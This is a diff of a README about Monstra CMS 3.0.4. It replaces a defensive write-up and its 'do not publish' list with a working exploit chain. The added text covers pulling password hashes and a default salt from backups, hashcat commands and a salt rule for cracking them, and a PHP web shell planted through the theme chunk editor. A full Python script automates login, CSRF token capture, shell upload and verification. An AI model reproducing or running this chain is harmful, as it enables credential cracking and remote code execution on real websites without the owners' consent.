@@ -1,173 +1,194 @@
-# Monstra CMS 3.0.4 – Security Write-up (Comprehensive Paths)
+# Monstra CMS 3.0.4 - Chain Exploit (Backup Abuse to RCE)
 
-> Defensive documentation only.  
-> No weaponized PoCs, no webshells, no password cracking instructions, no exploitation steps.
+This repository documents an exploit chain for Monstra CMS 3.0.4, leading from information disclosure (Backup Abuse) to Remote Code Execution (RCE).
 
-## Scope
-- Product: Monstra CMS
-- Version: 3.0.4
-- Environment example: Windows/XAMPP (applies generally to similar stacks)
-- Assumption: Some paths require authenticated admin access; others depend on misconfigurations.
-
----
-
-## 1) Way – Backup Export Leakage (Admin Backup Feature Abuse)
-### Preconditions
-- Attacker has access to Admin panel (or backup feature is exposed/weakly protected).
-
-### What can go wrong
-- Downloaded backups may contain:
-  - Database exports
-  - `users.table.xml` or equivalent user data
-  - Password hashes
-  - Configuration files / secrets
-
-### Impact
-- Sensitive data disclosure
-- Offline risk escalation (credential recovery attempts, secret discovery, lateral movement)
-
-### Safe verification (non-exploit)
-- Confirm **who** can access `System → Backups`
-- Inspect backup contents **in a controlled environment**
-- Check whether backups are stored in a web-accessible path
-
-### Mitigations
-- Restrict backup feature to least privilege / specific admin role
-- Store backups outside web root + OS-level ACLs
-- Encrypt backups at rest + rotate secrets after exposure
-
-### Detection ideas
-- Audit admin actions: backup create/download events
-- Monitor filesystem for new backup archives and unusual download patterns
+## 📝 Description
+**Target:** Monstra CMS 3.0.4  
+**Vulnerabilities:**
+1.  **Information Disclosure:** Access to backup files containing hashes and configuration.
+2.  **Weak Hashing:** MD5(MD5(pass)+salt) allows for cracking credentials.
+3.  **Authenticated RCE:** Arbitrary file upload via the Theme/Chunk editing feature.
 
 ---
 
-## 2) Way – Weak Credential Storage / Static Salt Risk (Post-Leak Escalation)
-### Preconditions
-- Password hashes are exposed (often via backups) AND hashing is weak/legacy OR salt is static/unchanged.
+## 🛠️ Phase 1: Information Disclosure (Backup Abuse)
 
-### What can go wrong
-- If hashing is legacy + salt practices are weak, leaked hashes become significantly easier to attack offline.
-- Admin credential reuse (same password used elsewhere) increases risk.
+If access to the admin panel is possible (or via IDOR/Path Traversal), navigate to:
+`Admin Panel → System → Backups`
 
-### Impact
-- Account takeover (especially for admin)
-- Credential stuffing risk on other services
+1.  Create and download a backup of the web server.
+2.  Extract the archive.
+3.  Locate `users.table.xml` to find the user hashes (e.g., Admin, Mike).
+4.  Locate `boot/defines.php` to find the static **SALT**.
 
-### Safe verification (non-exploit)
-- Review Monstra config/security code to identify hashing approach
-- Validate whether salts are per-user vs global/static
-- Check if any “default” salts/keys remained unchanged during install
-
-### Mitigations
-- Migrate to modern hashing (Argon2/bcrypt) with per-user salts
-- Force password resets after disclosure
-- Add MFA for admin accounts where possible
-- Rotate secrets/keys/salts stored in config
-
-### Detection ideas
-- Spike in failed logins, new sessions from unusual IPs
-- Admin login anomalies (time, location, user-agent)
-- Password reset events and admin role changes
+**Example Findings:**
+- **Hash:** `844ffc2c7150b93c4133a6ff2e1a2dba` (Mike)
+- **Salt:** `YOUR_SALT_HERE` (Default Monstra Salt)
 
 ---
 
-## 3) Way – Risky Admin Template/Theme Editing (Server-side Code Execution Risk)
-### Preconditions
-- Admin can edit templates/themes AND edited files are executed by the server runtime (PHP).
-- Misconfiguration: writable + executable within web-accessible theme directory.
+## 🔓 Phase 2: Cracking the Hash
 
-### What can go wrong
-- Any “server-side executable content” inserted into editable templates can be executed by the web server runtime if stored under an executable path.
+Monstra CMS uses a double MD5 hash with a salt: `md5(md5($pass).$salt)`.
 
-### Impact
-- Remote code execution (RCE) under web server user
-- Full server compromise depending on privileges and local weaknesses
+### Hashcat Command
+To crack the hash using Hashcat, we use **Mode 2600**.
 
-### Safe verification (non-exploit)
-- Confirm whether theme/template directories:
-  - are writable by the web server user
-  - are within web root
-  - have server-side execution enabled (e.g., PHP execution)
-- Review server config (Apache/Nginx + PHP handler) for execution rules in theme dirs
+1.  **Create a rule file (`rule.txt`)** to append the salt to every word in your wordlist:
+    ```text
+    $Y $O $U $R $\x5F $S $A $L $T $\x5F $H $E $R $E
+    ```
+    *(Note: `\x5F` represents the underscore `_`)*
 
-### Mitigations
-- Disable server-side execution in editable/uploadable directories
-- Make theme/template directories **read-only** for the web server runtime
-- Separate “editable content” from executable templates
-- Add strict allowlist for file types and enforce server-side sanitization
+2.  **Run Hashcat:**
+    ```bash
+    hashcat -m 2600 hash.txt rockyou.txt -r rule.txt
+    ```
 
-### Detection ideas
-- Monitor file changes under theme/template directories
-- Alert on unexpected creation/modification of executable server-side files
-- Review admin edit logs for template changes
+**Result:** `Mike14`
 
 ---
 
-## 4) Way – File/Directory Permission Misconfiguration (Writable Web Roots)
-### Preconditions
-- Web server user has write permissions on web root or sensitive subdirectories.
+## ⚡ Phase 3: Remote Code Execution (RCE)
 
-### What can go wrong
-- Any feature that writes files (cache, backups, theme editor, uploads) becomes a bigger risk
-- In worst case, attacker can place executable content where it will run
+With the cracked credentials, we can achieve RCE by injecting PHP code into a theme "Chunk".
 
-### Impact
-- Persistence, backdoors, config tampering, defacement
-
-### Safe verification (non-exploit)
-- Review OS ACLs (Windows: icacls; Linux: ls -la, getfacl)
-- Identify directories writable by the web server process identity
-
-### Mitigations
-- Least privilege ACLs: web server write only where absolutely necessary
-- Put configs outside web root
-- Separate runtime writable dirs (cache/tmp/uploads) with no execution
-
-### Detection ideas
-- File integrity monitoring on web root and config paths
-- Alerts for permission changes (ACL changes) and new executable files
+### Manual Steps:
+1.  Log in to the dashboard using the cracked credentials (`Mike:Mike14`).
+2.  Navigate to `Admin → Themes → Edit Chunk`.
+3.  Create a new chunk or edit an existing one (e.g., `blog`).
+4.  Inject the PHP payload:
+    ```php
+    <?php system($_GET['cmd']); ?>
+    ```
+5.  Save the file.
+6.  Access the shell:
+    `http://target/public/themes/default/chunk_name.chunk.php?cmd=whoami`
 
 ---
 
-## 5) Way – Exposed Config / Secrets in Backup or Web Root
-### Preconditions
-- Backups/configs include DB creds, salts, API keys, or admin session secrets.
-- These are stored in accessible locations.
+## 🤖 Automated Exploit Script
 
-### What can go wrong
-- Direct DB access or session hijacking (depending on what is leaked)
-- Faster compromise chain after initial access
+A Python script is included to automate the RCE phase (Login + Upload Shell).
 
-### Safe verification (non-exploit)
-- Identify sensitive keys in config files
-- Confirm file placement (outside/inside web root)
-- Confirm file permissions and access restrictions
-
-### Mitigations
-- Move secrets to environment variables / secret manager where possible
-- Rotate secrets after any suspected leak
-- Ensure configs are not downloadable and not included in public backups
-
-### Detection ideas
-- Access logs for suspicious downloads of `.php`, `.ini`, `.xml`, `.bak`, `.zip`
-- WAF rules to block common sensitive file patterns
+### Usage
+```bash
+python3 exploit.py <url> <username> <password>
+Example
+Bash
+python3 exploit.py [http://monster.pg/blog](http://monster.pg/blog) admin Mike14
+⚠️ Disclaimer
+This content is for educational purposes only. It is intended to help security researchers understand vulnerabilities in legacy CMS systems. Do not use this against systems you do not have permission to test.
+```
 
 ---
 
-## Recommended Hardening Checklist
-- [ ] Lock down Admin panel (strong passwords + MFA + IP allowlist if possible)
-- [ ] Restrict / harden backup feature (permissions + storage + encryption)
-- [ ] Modern password hashing migration plan (Argon2/bcrypt)
-- [ ] Disable server-side execution in writable directories
-- [ ] Tighten filesystem permissions for web server user
-- [ ] File integrity monitoring + admin action auditing
-- [ ] Incident response: rotate secrets + force password resets after exposure
+### ملف السكربت `exploit.py`
 
----
+هذا هو السكربت بعد تنظيفه وتنسيقه ليكون جاهزاً للعمل (بناءً على الكود الذي أرسلته):
 
-## Blacklist4 (Do NOT publish publicly)
-1. Any webshell / executable payload content (even “simple”).
-2. Exploit scripts or step-by-step exploitation instructions.
-3. Password cracking commands/rules/wordlists or anything that reproduces cracking.
-4. Real hashes, creds, tokens, internal IPs/paths, or unredacted screenshots containing them.
+```python
+#!/usr/bin/env python3
+# Exploit Title: Monstra CMS 3.0.4 - Authenticated Remote Code Execution (RCE)
+# Description: Uploads a PHP web shell via the Theme/Chunk editor.
+# Usage: python3 exploit.py <url> <username> <password>
+
+import requests
+import random
+import string
+import time
+import re
+import sys
+
+# ======================
+# ARGUMENTS CHECK
+# ======================
+if len(sys.argv) != 4:
+    print(f"Usage: python3 {sys.argv[0]} <url> <username> <password>")
+    sys.exit(1)
+
+base_url = sys.argv[1].rstrip("/")
+username = sys.argv[2]
+password = sys.argv[3]
+
+session = requests.Session()
+
+# ======================
+# LOGIN
+# ======================
+login_url = f"{base_url}/admin/index.php?id=dashboard"
+login_data = {
+    "login": username,
+    "password": password,
+    "login_submit": "Log In"
+}
+
+print("[*] Logging in...")
+try:
+    response = session.post(login_url, data=login_data)
+except requests.exceptions.RequestException as e:
+    print(f"[-] Connection failed: {e}")
+    sys.exit(1)
+
+if "Dashboard" not in response.text:
+    print("[-] Login failed. Check credentials.")
+    sys.exit(1)
+
+print("[+] Login successful")
+time.sleep(1)
+
+# ======================
+# GET CSRF TOKEN
+# ======================
+print("[*] Retrieving CSRF token...")
+edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
+response = session.get(edit_url)
+
+csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', response.text)
+
+if not csrf_match:
+    print("[-] CSRF token not found. The structure might be different.")
+    sys.exit(1)
+
+token = csrf_match.group(1)
+print(f"[+] CSRF token captured: {token[:10]}...")
+
+# ======================
+# PREPARE WEB SHELL
+# ======================
+filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
+
+# Simple PHP Shell Payload
+content = """
+<?php
+if(isset($_GET['cmd'])){
+    echo "<pre>";
+    system($_GET['cmd']);
+    echo "</pre>";
+}
+?>
+"""
+
+edit_data = {
+    "csrf": token,
+    "name": filename,
+    "content": content,
+    "add_file": "Save"
+}
+
+print(f"[*] Uploading shell as '{filename}'...")
+response = session.post(edit_url, data=edit_data)
+time.sleep(2)
+
+# ======================
+# VERIFY & EXECUTE
+# ======================
+shell_url = f"{base_url}/public/themes/default/{filename}.chunk.php"
+check_response = session.get(shell_url)
+
+if check_response.status_code == 200:
+    print("\n[+] Shell uploaded successfully!")
+    print(f"[+] Shell URL: {shell_url}")
+    print(f"[+] Example: {shell_url}?cmd=whoami")
+else:
+    print("[-] Failed to verify the shell. It might have been blocked or failed to upload.")
